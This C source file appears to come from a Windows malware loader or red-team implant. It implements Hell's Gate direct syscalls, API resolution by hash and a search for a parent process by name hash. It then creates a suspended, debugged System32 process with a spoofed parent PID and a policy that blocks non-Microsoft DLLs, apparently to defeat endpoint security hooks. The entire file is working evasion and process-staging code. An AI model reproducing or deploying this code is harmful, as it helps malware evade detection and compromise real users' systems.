#include <ntstatus.h>

#include "common.h"
#include "typedef.h"

// Procedures from HellsGate.asm
extern VOID	HellsGate(
	IN WORD wSyscallNumber,			// syscall number
	IN PVOID pSyscallInstAddress	// memory address of the `syscall` instruction
);
extern HellDescent();

// Procedure from Resolve.h (cannot include HashCalc.h definition directly owing to constexpr evaluations)
extern ULONG RTIME_FnvHashW(IN LPCWSTR String);

BOOL GetPsuedoParentProcess(
	IN	PSYSCALL_TABLE	pSyscallTable,
	IN	ULONG			uParentProcNameHash,
	OUT	PHANDLE			phProcess
) {
	NTSTATUS					STATUS = STATUS_SUCCESS;
	BOOL						bSTATE = TRUE;
	PSYSTEM_PROCESS_INFORMATION pSystemProcInfo = NULL,
		pSystemProcInfoCopy = NULL;
	ULONG						SystemProcInfoSize = sizeof(SYSTEM_PROCESS_INFORMATION);

	pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemProcInfoSize);

	if (!pSystemProcInfo) {
		bSTATE = FALSE; goto _EoF;
	}

	HellsGate(pSyscallTable->NtQuerySystemInformation.dwSSn, pSyscallTable->NtQuerySystemInformation.pSyscallInstAddress);
	STATUS = HellDescent(SystemProcessInformation, pSystemProcInfo, SystemProcInfoSize, &SystemProcInfoSize);

	while (STATUS == STATUS_INFO_LENGTH_MISMATCH) {
		HeapFree(GetProcessHeap(), 0, pSystemProcInfo);

		pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemProcInfoSize);

		if (!pSystemProcInfo) {
			bSTATE = FALSE; goto _EoF;
		}

		HellsGate(pSyscallTable->NtQuerySystemInformation.dwSSn, pSyscallTable->NtQuerySystemInformation.pSyscallInstAddress);
		STATUS = HellDescent(SystemProcessInformation, pSystemProcInfo, SystemProcInfoSize, &SystemProcInfoSize);
	}

	if (STATUS != STATUS_SUCCESS) {
		bSTATE = FALSE; goto _EoF;
	}

	pSystemProcInfoCopy = pSystemProcInfo;
	do {
		if (pSystemProcInfo->ImageName.Length && RTIME_FnvHashW(pSystemProcInfo->ImageName.Buffer) == uParentProcNameHash) {
			DEBUG_PRINT("Found Parent Process PID: %d\n", (DWORD)pSystemProcInfo->UniqueProcessId);

			OBJECT_ATTRIBUTES ObjAttr = { 0 };
			ObjAttr.Length = sizeof(OBJECT_ATTRIBUTES);

			CLIENT_ID Cid = {
				.UniqueProcess = pSystemProcInfo->UniqueProcessId,
				.UniqueThread = NULL
			};

			HellsGate(pSyscallTable->NtOpenProcess.dwSSn, pSyscallTable->NtOpenProcess.pSyscallInstAddress);
			STATUS = HellDescent(phProcess, PROCESS_CREATE_PROCESS, &ObjAttr, &Cid);
			if (STATUS == STATUS_SUCCESS) {
				break;
			}
		}
		pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcInfo + pSystemProcInfo->NextEntryOffset);

	} while (pSystemProcInfo->NextEntryOffset != NULL);

	if (*phProcess == NULL) {
		bSTATE = FALSE; goto _EoF;
	}

_EoF:
	if (pSystemProcInfoCopy) {
		HeapFree(GetProcessHeap(), 0, pSystemProcInfoCopy);
	}

	return bSTATE;
}

BOOL CreateSuspendedProcess(
	IN	PH_API	pHashedApis,
	IN	LPCWSTR	lpszProcessName,
	IN	HANDLE	hParentProcess,
	OUT	PHANDLE	phProcess,
	OUT	PHANDLE	phThread,
	OUT	PDWORD	pdwProcessID
) {
	BOOL	bSTATE = TRUE;
	WCHAR	lpszTargetProcessPath[MAX_PATH * 2];
	WCHAR	SysDir[MAX_PATH],
		WinDir[MAX_PATH];

	SIZE_T	sThreadAttrListSize = 0;

	STARTUPINFOEXW	Si = { 0 };
	PROCESS_INFORMATION Pi = { 0 };

	if (!GetEnvironmentVariableW(L"WINDIR", WinDir, MAX_PATH)) {
		DEBUG_PRINT("GetEnvironmentVariableW failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _EoF;
	}

	swprintf_s(SysDir, MAX_PATH, L"%s\\System32", WinDir);
	swprintf_s(lpszTargetProcessPath, MAX_PATH * 2, L"%s\\%s", SysDir, lpszProcessName);

	// This will fail with ERROR_INSUFFICIENT_BUFFER, but write the required size in `sThreadAttrListSize`
	pHashedApis->pInitializeProcThreadAttributeList(NULL, 2, 0, &sThreadAttrListSize);

	Si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttrListSize);
	if (!Si.lpAttributeList) {
		bSTATE = FALSE; goto _EoF;
	}

	pHashedApis->pInitializeProcThreadAttributeList(Si.lpAttributeList, 2, 0, &sThreadAttrListSize);

	// PPID Spoofing
	if (!pHashedApis->pUpdateProcThreadAttribute(Si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		DEBUG_PRINT("UpdateProcThreadAttribute failed with error: %lu\n", GetLastError());
		bSTATE = FALSE; goto _EoF;
	}

	// Enable blocking of non-Microsoft signed DLLs
	DWORD64 dwPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	if (!pHashedApis->pUpdateProcThreadAttribute(Si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwPolicy, sizeof(DWORD64), NULL, NULL)) {
		DEBUG_PRINT("UpdateProcThreadAttribute failed with error: %lu\n", GetLastError());
		bSTATE = FALSE; goto _EoF;
	}


	Si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

	if (!pHashedApis->pCreateProcessW(NULL, lpszTargetProcessPath, NULL, NULL, FALSE, DEBUG_PROCESS | EXTENDED_STARTUPINFO_PRESENT, NULL, SysDir, &Si, &Pi)) {
		DEBUG_PRINT("CreateProcessW failed with error: %lu\n", GetLastError());
		bSTATE = FALSE; goto _EoF;
	}

	*phProcess = Pi.hProcess;
	*phThread = Pi.hThread;
	*pdwProcessID = Pi.dwProcessId;

	// End of Function
_EoF:
	if (Si.lpAttributeList) {
		HeapFree(GetProcessHeap(), 0, Si.lpAttributeList);
	}
	if (*phProcess == NULL || *phThread == NULL) {
		bSTATE = FALSE;
	}
	return bSTATE;
}
